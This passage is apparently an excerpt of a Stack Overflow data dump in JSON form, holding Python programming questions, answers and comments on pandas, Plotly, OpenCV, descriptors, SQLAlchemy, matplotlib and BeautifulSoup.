"title": "How to concat two CSV files using Pandas when there is no common column", "body": "<p>I have 2 CSV files.</p>\n\n<pre><code>df1 = pd.DataFrame({'Employee': ['ABC', 'XYZ', 'DEF', 'KLM'], \n                   'Age': [25, 32, 38, 40]})\n</code></pre>\n\n<p></p>\n\n<pre><code>  Employee  Age\n0      ABC   25\n1      XYZ   32\n2      DEF   38\n3      KLM   40\n</code></pre>\n\n<hr>\n\n<pre><code>df2 = pd.DataFrame({'Dept': ['IT']})\n</code></pre>\n\n<p></p>\n\n<pre><code>  Dept\n0   IT\n</code></pre>\n\n<p>When i try to do concat using pandas using the following code,</p>\n\n<pre><code>df1=pd.read_csv(\"file_A\")\n\ndf2=pd.read_csv(\"file_B\")\n\npd.concat([df2,df1])\n</code></pre>\n\n<p>I am getting below result :</p>\n\n<p><a href=\"https://i.stack.imgur.com/g5kNB.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/g5kNB.png\" alt=\"enter image description here\"></a> </p>\n\n<p>But this is what am expecting :</p>\n\n<p><a href=\"https://i.stack.imgur.com/ZqRrO.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/ZqRrO.png\" alt=\"enter image description here\"></a></p>\n\n<p>any help is appreciated.</p>\n"}, {"tags": ["python", "plotly", "markers", "plotly-python", "scatterplot3d"], "answers": [{"tags": [], "owner": {"reputation": 28403, "user_id": 3437787, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8tmU.jpg?s=128&g=1", "display_name": "vestland", "link": "https://stackoverflow.com/users/3437787/vestland"}, "is_accepted": true, "score": 6, "last_activity_date": 1571916483, "creation_date": 1571916483, "answer_id": 58540366, "question_id": 58532310, "link": "https://stackoverflow.com/questions/58532310/how-to-style-format-point-markers-in-plotly-3d-scatterplot/58540366#58540366", "title": "How to style/format point markers in Plotly 3D scatterplot?", "body": "<p>You can use multiple <code>go.Scatter3d()</code> statements and gather them in a list to format each and every segment or extreme values more or less exactly as you'd like. This can be a bit more demanding than using <code>px.scatter_3d()</code>, but it will give you more control. The following plot is produced by the snippet below:</p>\n\n<p><strong>Plot:</strong></p>\n\n<p><a href=\"https://i.stack.imgur.com/hKZYT.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/hKZYT.png\" alt=\"enter image description here\"></a></p>\n\n<p><strong>Code:</strong></p>\n\n<pre><code>import plotly.graph_objects as go\nimport numpy as np\nimport pandas as pd\n\n# sample data\nt = np.linspace(0, 10, 50)\nx, y, z = np.cos(t), np.sin(t), t\n\n# plotly data\ndata=[go.Scatter3d(x=[x[2]], y=[y[2]], z=[z[2]],mode='markers', marker=dict(size=20), opacity=0.8),\n      go.Scatter3d(x=[x[26]], y=[y[26]], z=[z[26]],mode='markers', marker=dict(size=30), opacity=0.3),\n      go.Scatter3d(x=x, y=y, z=z,mode='markers')]\n\nfig = go.Figure(data)\nfig.show()\n</code></pre>\n\n<p>How you identify the different segmens, whether it be max or min values will be entirely up to you. Anyway, I hope this approach will be useful!</p>\n"}], "owner": {"reputation": 2313, "user_id": 7375754, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/830f6d236ab0502a68fd9b9daf7f729f?s=128&d=identicon&r=PG&f=1", "display_name": "Jane Sully", "link": "https://stackoverflow.com/users/7375754/jane-sully"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2558, "favorite_count": 2, "accepted_answer_id": 58540366, "answer_count": 1, "score": 6, "last_activity_date": 1601526643, "creation_date": 1571874305, "last_edit_date": 1601526643, "question_id": 58532310, "link": "https://stackoverflow.com/questions/58532310/how-to-style-format-point-markers-in-plotly-3d-scatterplot", "title": "How to style/format point markers in Plotly 3D scatterplot?", "body": "<p>I am unsure how to customize scatterplot marker styles in Plotly scatterplots. </p>\n\n<p>Specifically, I have a column <code>predictions</code> that is 0 or 1 (1 represents an unexpected value) and even though I used the <code>symbol</code> parameter in px.scatter_3d to indicate the unexpected value through varying point shape (diamond for 1 and circle for 0), the difference is very subtle and I want it to be more dramatic. I was envisioning something like below (doesn't need to be exactly this), but something along the lines of the diamond shaped points have a different outline colors or an additional shape/bubble around it. How would I do this?</p>\n\n<p>Additionally, I have a <code>set</code> column which can take on one of two values, set A or set B. I used the color parameter inside <code>px.scatter_3d</code> and made that equal to <code>set</code> so the points are colored according to which set it came from. While it is doing what I asked, I don't want the colors to be blue and red, but any two colors I specify. How would I be able to this (let's say I want the colors to be blue and orange instead)? Thank you so much!</p>\n\n<p><a href=\"https://i.stack.imgur.com/pAq6m.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/pAq6m.png\" alt=\"enter image description here\"></a></p>\n\n<p>Here is the code I used:</p>\n\n<pre><code>fig = px.scatter_3d(X_combined, x='x', y='y', z='z',\n                    color='set', symbol='predictions', opacity=0.7)\n\nfig.update_traces(marker=dict(size=12,\n                         line=dict(width=5,\n                         color='Black')),\n              selector=dict(mode='markers'))\n</code></pre>\n"}, {"tags": ["python", "opencv", "python-imaging-library"], "comments": [{"owner": {"reputation": 27168, "user_id": 7355741, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6CMNt.jpg?s=128&g=1", "display_name": "fmw42", "link": "https://stackoverflow.com/users/7355741/fmw42"}, "edited": false, "score": 0, "creation_date": 1571874625, "post_id": 58532271, "comment_id": 103388259, "body": "Is the purpose to change an existing palette or change the images so that it goes from 24-bit color to 8-bit palette color with the pixels changed to the nearest color in the palette?"}, {"owner": {"reputation": 41, "user_id": 7029915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff20fc91860c898aa9946e04488dafcc?s=128&d=identicon&r=PG", "display_name": "HyunWoo Park", "link": "https://stackoverflow.com/users/7029915/hyunwoo-park"}, "reply_to_user": {"reputation": 27168, "user_id": 7355741, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6CMNt.jpg?s=128&g=1", "display_name": "fmw42", "link": "https://stackoverflow.com/users/7355741/fmw42"}, "edited": false, "score": 0, "creation_date": 1571874857, "post_id": 58532271, "comment_id": 103388297, "body": "@fmw42 purpose is to see a grayscale image(pixel value is 0 ~ 15 ) as a colorized image (pixel value is assigned rgb ) for better look by using custom palette."}, {"owner": {"reputation": 27168, "user_id": 7355741, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6CMNt.jpg?s=128&g=1", "display_name": "fmw42", "link": "https://stackoverflow.com/users/7355741/fmw42"}, "edited": false, "score": 0, "creation_date": 1571876269, "post_id": 58532271, "comment_id": 103388528, "body": "You can do that using lookup tables, where the color table is created as an image, not a list. See <a href=\"https://stackoverflow.com/questions/29544728/using-a-lookup-table-with-opencv-and-numpy\" title=\"using a lookup table with opencv and numpy\">stackoverflow.com/questions/29544728/&hellip;</a> and <a href=\"https://www.learnopencv.com/applycolormap-for-pseudocoloring-in-opencv-c-python/\" rel=\"nofollow noreferrer\">learnopencv.com/&hellip;</a>"}, {"owner": {"reputation": 41, "user_id": 7029915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff20fc91860c898aa9946e04488dafcc?s=128&d=identicon&r=PG", "display_name": "HyunWoo Park", "link": "https://stackoverflow.com/users/7029915/hyunwoo-park"}, "reply_to_user": {"reputation": 27168, "user_id": 7355741, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6CMNt.jpg?s=128&g=1", "display_name": "fmw42", "link": "https://stackoverflow.com/users/7355741/fmw42"}, "edited": false, "score": 0, "creation_date": 1571877084, "post_id": 58532271, "comment_id": 103388673, "body": "@fmw42 LUT! thanks. I&#39;ll try right away."}, {"owner": {"reputation": 41, "user_id": 7029915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff20fc91860c898aa9946e04488dafcc?s=128&d=identicon&r=PG", "display_name": "HyunWoo Park", "link": "https://stackoverflow.com/users/7029915/hyunwoo-park"}, "reply_to_user": {"reputation": 27168, "user_id": 7355741, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6CMNt.jpg?s=128&g=1", "display_name": "fmw42", "link": "https://stackoverflow.com/users/7355741/fmw42"}, "edited": false, "score": 0, "creation_date": 1571879684, "post_id": 58532271, "comment_id": 103389093, "body": "@fmw42 It works like charm. Thank you very much."}], "owner": {"reputation": 41, "user_id": 7029915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ff20fc91860c898aa9946e04488dafcc?s=128&d=identicon&r=PG", "display_name": "HyunWoo Park", "link": "https://stackoverflow.com/users/7029915/hyunwoo-park"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 434, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1571875258, "creation_date": 1571874034, "last_edit_date": 1571875258, "question_id": 58532271, "link": "https://stackoverflow.com/questions/58532271/is-there-any-function-like-pil-putpalette-in-opencv-python", "title": "Is there any function like pil putpalette in OpenCV Python?", "body": "<p>I'm trying to use Opencv python to make colorized image from 1 channel class info image. Image is consist of 0 ~ 15 for each pixel. </p>\n\n<p>I saw some code that used PIL putpalette for this work. However, I want to change this code to Opencv.</p>\n\n<p>I made double for loop for this work using list.</p>\n\n<p>the length of list (custom palette) is 256*3 and see belows:</p>\n\n<pre><code>palette = [0, 0, 0, # r g b for pixel 0 \n\n           128,0,0, # r g b for pixel 1\n\n           0, 255, 0, # r g b for pixel 2\n\n           ...\n           0, 255, 128 # r g b for pixel 15\n           ]\nzero_pad = 256 * 3 - len(palette)\nfor i in range(zero_pad):\n    palette.append(0)\n</code></pre>\n\n<p>This is code that I made. Input pred is 1 channel image (0~15 each pixel)</p>\n\n<pre><code>pred_r = np.zeros_like(pred)\npred_g = np.zeros_like(pred)\npred_b = np.zeros_like(pred)\n\nfor x in range(0, pred.shape[0]):\n    for y in range(0, pred.shape[1]):\n        pred_r[x][y] = palette[pred[x][y] * 3]\n        pred_g[x][y] = palette[pred[x][y] * 3 + 1]\n        pred_b[x][y] = palette[pred[x][y] * 3 + 2]\n\ncolorized_pred = cv2.merge((pred_b, pred_g, pred_r))\n</code></pre>\n\n<hr>\n\n<h1>Reference PIL Code</h1>\n\n<pre><code>pred = Image.fromarray(pred).convert('L')\npred.putpalette(palette)\n</code></pre>\n\n<p>For loop takes long time. So I want to know is there any opencv function like reference PIL code. Thanks</p>\n"}, {"tags": ["python", "descriptor", "setattribute", "getattribute", "setattr"], "owner": {"reputation": 144, "user_id": 7641256, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ec68caa88a9a0cbf6ea905951978a083?s=128&d=identicon&r=PG&f=1", "display_name": "A.King", "link": "https://stackoverflow.com/users/7641256/a-king"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 14, "favorite_count": 0, "closed_date": 1571874059, "answer_count": 0, "score": 1, "last_activity_date": 1571874088, "creation_date": 1571873931, "last_edit_date": 1571874088, "question_id": 58532255, "link": "https://stackoverflow.com/questions/58532255/python-descriptors-set-and-get-behaviour", "closed_reason": "Duplicate", "title": "Python descriptors set and get behaviour", "body": "<p>Say, we put two different descriptors in a class, and then check how they work being requested from an instance and a class itself.</p>\n\n<pre class=\"lang-py prettyprint-override\"><code>class DescrGet:\n    def __get__(self, instance, typ):\n        print(\"DescrGet\")\n\nclass DescrSet:\n    def __set__(self, instance, value):\n        print(\"DescrSet\")\n\nclass A:\n    descr_get = DescrGet()\n    descr_set = DescrSet()\n</code></pre>\n\n<pre class=\"lang-py prettyprint-override\"><code>&gt;&gt;&gt; a = A()\n&gt;&gt;&gt; a.descr_get\nDescrGet\n&gt;&gt;&gt; a.descr_set = 42\nDescrSet\n&gt;&gt;&gt; A.descr_get\nDescrGet\n&gt;&gt;&gt; A.descr_set = 42\n&gt;&gt;&gt; print(A.descr_set)\n42\n</code></pre>\n\n<p>Seems like quite inconsistent behaviour.\nFrom python docs page about <a href=\"https://docs.python.org/3/howto/descriptor.html\" rel=\"nofollow noreferrer\">descriptors</a>, I get the basic concepts of how python looks up for requested attribute. But it says nothing about setting an atribute.\nHere, after searching in <code>type(A).__dict__</code> (finds nothing of course) python continues to search in <code>A.__dict__</code> for descriptor and when successfully finds it, calls <code>__get__</code> method but (surprisingly) doesn't call <code>__set__</code> and simply sets <code>A.a</code> to 42.</p>\n\n<p>Could someone provide explanation for such behaviour or give any links?</p>\n"}, {"tags": ["python", "python-3.x", "pandas", "sqlalchemy", "pymssql"], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user12688781"}, "is_accepted": false, "score": 0, "last_activity_date": 1579514029, "creation_date": 1579514029, "answer_id": 59820717, "question_id": 58532240, "link": "https://stackoverflow.com/questions/58532240/how-to-execute-sql-stored-procedure-with-multiple-date-parameters-using-sqlalche/59820717#59820717", "title": "How to execute sql stored procedure with multiple date parameters using sqlalchemy in pandas", "body": "<p>Read_sql is just for reading tables. To execute someting with parameters try using </p>\n\n<p>engine.execute(your sql query)#you can try entering with parameters as how you give \n                              in your sql\nengine.execution_options(autocommit=True)</p>\n"}, {"tags": [], "owner": {"reputation": 97598, "user_id": 2144390, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/6QjmY.jpg?s=128&g=1", "display_name": "Gord Thompson", "link": "https://stackoverflow.com/users/2144390/gord-thompson"}, "is_accepted": true, "score": 1, "last_activity_date": 1579529502, "creation_date": 1579529502, "answer_id": 59825047, "question_id": 58532240, "link": "https://stackoverflow.com/questions/58532240/how-to-execute-sql-stored-procedure-with-multiple-date-parameters-using-sqlalche/59825047#59825047", "title": "How to execute sql stored procedure with multiple date parameters using sqlalchemy in pandas", "body": "<p>If you are executing a raw SQL query with parameter placeholders then you must use the <a href=\"https://www.python.org/dev/peps/pep-0249/#paramstyle\" rel=\"nofollow noreferrer\">paramstyle</a> supported by the DBAPI layer. pymssql used the \"format\" paramstyle <code>%s</code>, not the \"qmark\" paramstyle <code>?</code> (which pyodbc uses).</p>\n\n<p>However, you can avoid the ambiguity by wrapping the query in a SQLAlchemy <code>text</code> object and consistently use the \"named\" paramstyle. SQLAlchemy will automatically translate the parameter placeholders to the appropriate style for the DBAPI you are using. For example, to call a stored procedure named <code>echo_datetimes</code>:</p>\n\n<pre class=\"lang-python prettyprint-override\"><code>import datetime\nimport sqlalchemy as sa\n\n# ...\n\nquery = sa.text(\"EXEC echo_datetimes @p1 = :param1, @p2 = :param2\")\nvalues = {'param1': datetime.datetime(2020, 1, 1, 1, 1, 1),\n          'param2': datetime.datetime(2020, 2, 2, 2, 2, 2)}\ndf = pd.read_sql_query(query, engine, params=values)\nprint(df)\n#              dt_start              dt_end\n# 0 2020-01-01 01:01:01 2020-02-02 02:02:02\n</code></pre>\n"}], "owner": {"reputation": 3607, "user_id": 6043544, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/fafb6acf4f4504b54e7484bc0c17cc7a?s=128&d=identicon&r=PG&f=1", "display_name": "Serdia", "link": "https://stackoverflow.com/users/6043544/serdia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 314, "favorite_count": 0, "accepted_answer_id": 59825047, "answer_count": 2, "score": 0, "last_activity_date": 1579529519, "creation_date": 1571873802, "last_edit_date": 1579529519, "question_id": 58532240, "link": "https://stackoverflow.com/questions/58532240/how-to-execute-sql-stored-procedure-with-multiple-date-parameters-using-sqlalche", "title": "How to execute sql stored procedure with multiple date parameters using sqlalchemy in pandas", "body": "<p><strong>I am able to execute stored procedure without parameters:</strong></p>\n\n<pre><code>import pandas as pd\nimport sqlalchemy\nimport pyodbc\nimport datetime as dt  \n\nengine = sqlalchemy.create_engine('mssql+pymssql://MyServer/MyDB')\ndf = pd.read_sql_query('EXEC dbo.TestProcedure' , engine)  # stored procedure without parameters\nprint(df)\n</code></pre>\n\n<p><strong>But unable to execute stored procedure with parameters:</strong></p>\n\n<pre><code>import pandas as pd\nimport sqlalchemy\nimport pyodbc\nimport datetime as dt  \n\nmyparams = ['2017-02-01','2017-02-28', None]  # None substitutes NULL in sql\n\nengine = sqlalchemy.create_engine('mssql+pymssql://MyServer/MyDB')\ndf = pd.read_sql_query('EXEC PythonTest_Align_RSrptAccountCurrentMunich @EffectiveDateFrom=?,@EffectiveDateTo=?,@ProducerLocationID=?', engine, params=myparams)\nprint(df)\n</code></pre>\n\n<p><strong>Error message:</strong></p>\n\n<pre><code>  File \"src\\pymssql.pyx\", line 465, in pymssql.Cursor.execute\nsqlalchemy.exc.ProgrammingError: (pymssql.ProgrammingError) (102, b\"Incorrect syntax near '?'.DB-Lib error message 20018, severity 15:\\nGeneral SQL Server error: Check messages from the SQL Server\\n\")\n[SQL: EXEC PythonTest_Align_RSrptAccountCurrentMunich @EffectiveDateFrom=?,@EffectiveDateTo=?,@ProducerLocationID=?]\n[parameters: ('2017-02-01', '2017-02-28', None)]\n(Background on this error at: http://sqlalche.me/e/f405)\n</code></pre>\n\n<p>How can I pass parameters using <code>sqlalchemy</code>?</p>\n"}, {"tags": ["python", "pandas", "numpy", "matplotlib"], "comments": [{"owner": {"reputation": 2324, "user_id": 6144626, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/w5zgz.jpg?s=128&g=1", "display_name": "Ari Cooper-Davis", "link": "https://stackoverflow.com/users/6144626/ari-cooper-davis"}, "edited": false, "score": 0, "creation_date": 1571874371, "post_id": 58532222, "comment_id": 103388212, "body": "What line do you get that error on? That is key as it tells you what bit of your code is wrong."}, {"owner": {"reputation": 1369, "user_id": 2985601, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/62c77fbeb29692f9b32171c63b464714?s=128&d=identicon&r=PG", "display_name": "MarkAWard", "link": "https://stackoverflow.com/users/2985601/markaward"}, "edited": false, "score": 0, "creation_date": 1571874510, "post_id": 58532222, "comment_id": 103388245, "body": "i cant tell exactly where your error is coming from but i think it&#39;s caused by <code>final = table.tail(1); names_list = list(final)</code> that&#39;s probably not what you want. try out <code>names_list = table.columns[1:4]</code>"}], "answers": [{"tags": [], "owner": {"reputation": 544, "user_id": 3372006, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73892eb672f05f8d2773cff6fa0b5980?s=128&d=identicon&r=PG&f=1", "display_name": "xiaxio", "link": "https://stackoverflow.com/users/3372006/xiaxio"}, "is_accepted": false, "score": 0, "last_activity_date": 1571875814, "creation_date": 1571875814, "answer_id": 58532458, "question_id": 58532222, "link": "https://stackoverflow.com/questions/58532222/python-csv-to-barchart-using-matplotlib/58532458#58532458", "title": "Python: CSV to Barchart using Matplotlib", "body": "<p>The error is because 'values' has 3 values on it, and position has 4 values on it. So, shape mismatch. There are also other things with x and y axis.\nCheck this code and let me know if it does what you expect:</p>\n\n<pre><code>def main():\n\n    table  = pd.DataFrame([[30, 1, 3, 26]], columns=['Number Oc', 'Oc A', 'Oc B', 'Oc C'])\n\n    final = table.tail(1)\n\n    names_list = list(final)\n    values     = [ final.values[0][1], final.values[0][2], final.values[0][3] ]\n\n    position = np.arange(len(names_list)-1)\n\n    plt.title(sys.argv[1].split('.')[0])\n\n    plt.bar(position,values,align='center')\n\n    plt.xticks(position, names_list[1:4])\n\n    plt.show()\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 107, "user_id": 8188139, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3ae98c3ea21ac93efcff7357386d098a?s=128&d=identicon&r=PG&f=1", "display_name": "AyiFF", "link": "https://stackoverflow.com/users/8188139/ayiff"}, "is_accepted": false, "score": 0, "last_activity_date": 1571876708, "creation_date": 1571876708, "answer_id": 58532551, "question_id": 58532222, "link": "https://stackoverflow.com/questions/58532222/python-csv-to-barchart-using-matplotlib/58532551#58532551", "title": "Python: CSV to Barchart using Matplotlib", "body": "<p><strong>ValueError: shape mismatch: objects cannot be broadcast to a single shape</strong></p>\n\n<hr>\n\n<p>Debug your code: </p>\n\n<ol>\n<li>Watch len(position) </li>\n<li>Watch len(values)</li>\n<li>Compare len(position) and len(values)</li>\n<li>You can find your len(position)!=len(values)</li>\n<li>matplotlib.pyplot.bar(x, height) require \u201cThe x coordinates of the bars and The height(s) of the bars should have the same length.\u201d</li>\n</ol>\n\n<p><strong>So you should keep the lengths of the two arrays consistent according to your needs.</strong></p>\n"}], "owner": {"reputation": 147, "user_id": 11149556, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/MclLS.png?s=128&g=1", "display_name": "Broxigar", "link": "https://stackoverflow.com/users/11149556/broxigar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 325, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1571876708, "creation_date": 1571873563, "last_edit_date": 1571874149, "question_id": 58532222, "link": "https://stackoverflow.com/questions/58532222/python-csv-to-barchart-using-matplotlib", "title": "Python: CSV to Barchart using Matplotlib", "body": "<p>I would like to draw a <strong>Bar chart</strong> from a CSV file which has the following format:</p>\n\n<pre><code>#Number of Occurrences, Occurrences of A, Occurrences of B, Occurrences of C\n30,1,3,26\n...\n</code></pre>\n\n<p>I am totally new to Matplotlib and I'm trying to understand how to do it.\nI wish for the y Axis to have the <strong>#Number of Occurences</strong> value (30 for the provided example), and three bars; The bar A,B and C with the respective values. </p>\n\n<p>How could I do it?</p>\n\n<p>My Code:</p>\n\n<pre><code>#!/usr/bin python\n\n\n\nimport matplotlib.pyplot as plt\nimport pandas as pd\nimport numpy as np\nimport sys\n\ndef main():\n\n    table  = pd.read_csv(sys.argv[1])\n\n    final = table.tail(1)\n\n    names_list = list(final)\n    values     = [ final.values[0][1], final.values[0][2], final.values[0][3] ]\n\n    position = np.arange(len(names_list)) \n\n    plt.title(sys.argv[1].split('.')[0])\n\n    plt.bar(position,values,align='center')\n\n    plt.yticks(position,names_list)\n\n    plt.show()\n\n\n\nif __name__ == '__main__':\n    main()\n</code></pre>\n\n<p>But I get \n<code>**ValueError: shape mismatch: objects cannot be broadcast to a single shape**</code></p>\n"}, {"tags": ["python", "variables", "integer"], "comments": [{"owner": {"reputation": 2324, "user_id": 6144626, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/w5zgz.jpg?s=128&g=1", "display_name": "Ari Cooper-Davis", "link": "https://stackoverflow.com/users/6144626/ari-cooper-davis"}, "edited": false, "score": 1, "creation_date": 1571873542, "post_id": 58532195, "comment_id": 103388069, "body": "Use <code>-=</code> not <code>=-</code>. <code>a =- 1</code> is interpreted as <code>a = -1</code> whereas <code>a -= 1</code> is interpreted as <code>a = a-1</code>."}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 12265726, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-VqpIJRZ0Lzo/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rcfy8lJSuqJPMZpOH-uJqapXp7bvg/photo.jpg?sz=128", "display_name": "Leyla Gulsen", "link": "https://stackoverflow.com/users/12265726/leyla-gulsen"}, "edited": false, "score": 0, "creation_date": 1571873753, "post_id": 58532204, "comment_id": 103388111, "body": "thanks, fixed that. now it says for the first line: &quot;unindent does not match any outer indentation level.&quot;"}, {"owner": {"reputation": 1320, "user_id": 5495906, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5b319c1b73d80f4155fbdd4fcb81525?s=128&d=identicon&r=PG&f=1", "display_name": "LegendofPedro", "link": "https://stackoverflow.com/users/5495906/legendofpedro"}, "edited": false, "score": 0, "creation_date": 1571874000, "post_id": 58532204, "comment_id": 103388149, "body": "Make sure you&#39;re not mixing tabs and spaces."}], "tags": [], "owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "is_accepted": true, "score": -1, "last_activity_date": 1571873404, "creation_date": 1571873404, "answer_id": 58532204, "question_id": 58532195, "link": "https://stackoverflow.com/questions/58532195/can-variables-in-python-be-negative-using-spritemover-and-trying-to-move-an-ima/58532204#58532204", "title": "Can variables in python be negative? Using SpriteMover and trying to move an image all around an edge of a screen", "body": "<p>The line above is missing <code>):</code> at the end.</p>\n"}], "owner": {"reputation": 11, "user_id": 12265726, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-VqpIJRZ0Lzo/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rcfy8lJSuqJPMZpOH-uJqapXp7bvg/photo.jpg?sz=128", "display_name": "Leyla Gulsen", "link": "https://stackoverflow.com/users/12265726/leyla-gulsen"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 31, "favorite_count": 0, "closed_date": 1571897183, "accepted_answer_id": 58532204, "answer_count": 1, "score": -3, "last_activity_date": 1571873420, "creation_date": 1571873315, "last_edit_date": 1571873420, "question_id": 58532195, "link": "https://stackoverflow.com/questions/58532195/can-variables-in-python-be-negative-using-spritemover-and-trying-to-move-an-ima", "closed_reason": "Not suitable for this site", "title": "Can variables in python be negative? Using SpriteMover and trying to move an image all around an edge of a screen", "body": "<p>In an engineering basics class and starting to learn python. My homework assignment is to move an image \"iulogo.gif\" that is 64x64. I have to move this image on an (640, 480) screen. I need to move this image around the edges of all parts of the screen starting from (0,0), to (640, 0), to (640, 480), and (480, 0), back to (0,0).</p>\n\n<p>My problem is going back from (640, 480) to (480, 0) to (0,0). I am moving by 0.5. When I move forward, I do \"x_position += 0.5\" and down y_position += 0.5\". But when I go backward and down, it says invalid syntax. I type \"-= 0.5\".</p>\n\n<pre><code>    while (1):\n            while (x_position &lt; 640):\n                    x_position += 0.5\n                    sm.write_x(x_position)\n                    sm.update_screen()\n            while (y_position &lt; 480):\n                    y_position += 0.5\n                    sm.write_y(y_position)\n                    sm.update_screen()\n            x_position = 640\n            sm.write_x(x_position)\n            y_position = 480\n            sm.write_x(x_position)\n            while (x_position &lt;=  640\n                    x_position =- 0.5        #here is the error\n                    sm.write_x(x_position)\n                    sm.update_screen()\n            while (y_position &lt;= 480):\n                    y_position =- 0.5        #most likely here too\n                    sm.write_y(y_position)\n                    sm.update_screen()\n            x_position = 0\n            sm.write_x(x_position)\n            y_position = 0\n            sm.write_y(y_position)\n</code></pre>\n\n<p>I expect the output of x_position -= 0.5 to move it backward 0.5, but the output is just a \"SyntaxError: invalid syntax\"</p>\n"}, {"tags": ["python", "python-3.x", "xml", "beautifulsoup"], "comments": [{"owner": {"reputation": 360, "user_id": 12233973, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EoF3C.jpg?s=128&g=1", "display_name": "c_sagan", "link": "https://stackoverflow.com/users/12233973/c-sagan"}, "edited": false, "score": 0, "creation_date": 1571874811, "post_id": 58532173, "comment_id": 103388291, "body": "<a href=\"https://stackoverflow.com/questions/6287529/how-to-find-children-of-nodes-using-beautifulsoup\">This StackOverflow question and answer</a> may help."}], "answers": [{"comments": [{"owner": {"reputation": 253, "user_id": 11315276, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-XkLMzK4iuQU/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rcRrUcmcIQTrBC7D5InZPbJr_1mjA/mo/photo.jpg?sz=128", "display_name": "ApacheOne", "link": "https://stackoverflow.com/users/11315276/apacheone"}, "edited": false, "score": 0, "creation_date": 1571875850, "post_id": 58532419, "comment_id": 103388467, "body": "Thank you for the detailed response and for pointing out that the opening tag was missing. Missed this during my edit before posting. I have a follow question tho. I am already looking through several data points within the affiliate node. I&#39;ll need to locate date created within the created for loop. Otherwise, I am just targeting affiliate &gt; date_created. Any recommendation on how to find this value once inside my for loop under for affiliate in soup.select(&#39;affiliate&#39;): instead?"}], "tags": [], "owner": {"reputation": 741, "user_id": 8004593, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nAk4F.jpg?s=128&g=1", "display_name": "lagripe", "link": "https://stackoverflow.com/users/8004593/lagripe"}, "is_accepted": false, "score": 0, "last_activity_date": 1571876349, "last_edit_date": 1571876349, "creation_date": 1571875408, "answer_id": 58532419, "question_id": 58532173, "link": "https://stackoverflow.com/questions/58532173/how-to-grab-first-child-of-its-kind/58532419#58532419", "title": "How to grab first child of its kind", "body": "<p>First of all your are missing the tag opening for <code>affiliate</code>which will make your parser go wrong</p>\n\n<pre><code>&lt;affiliate_export_response&gt;\n    &lt;success&gt;true&lt;/success&gt;\n    &lt;row_count&gt;1&lt;/row_count&gt;\n    &lt;affiliates&gt;\n        &lt;affiliate&gt; ======================= This was missing ================\n        &lt;blacklists&gt;\n          &lt;blacklist&gt;\n            &lt;advertiser&gt;\n              &lt;advertiser_id xmlns=\"API:id_name_store\"&gt;2&lt;/advertiser_id&gt;\n              &lt;advertiser_name xmlns=\"API:id_name_store\"&gt;wayne's Ad&lt;/advertiser_name&gt;\n            &lt;/advertiser&gt;\n            &lt;affiliate&gt;\n              &lt;affiliate_id xmlns=\"API:id_name_store\"&gt;3&lt;/affiliate_id&gt;\n              &lt;affiliate_name xmlns=\"API:id_name_store\"&gt;Mark Affiliate&lt;/affiliate_name&gt;\n            &lt;/affiliate&gt;\n            &lt;blacklist_reason&gt;\n              &lt;blacklist_reason_id xmlns=\"API:id_name_store\"&gt;1&lt;/blacklist_reason_id&gt;\n              &lt;blacklist_reason_name xmlns=\"API:id_name_store\"&gt;404&lt;/blacklist_reason_name&gt;\n            &lt;/blacklist_reason&gt;\n            &lt;blacklist_type&gt;\n              &lt;blacklist_type_id xmlns=\"API:id_name_store\"&gt;3&lt;/blacklist_type_id&gt;\n              &lt;blacklist_type_name xmlns=\"API:id_name_store\"&gt;404&lt;/blacklist_type_name&gt;\n            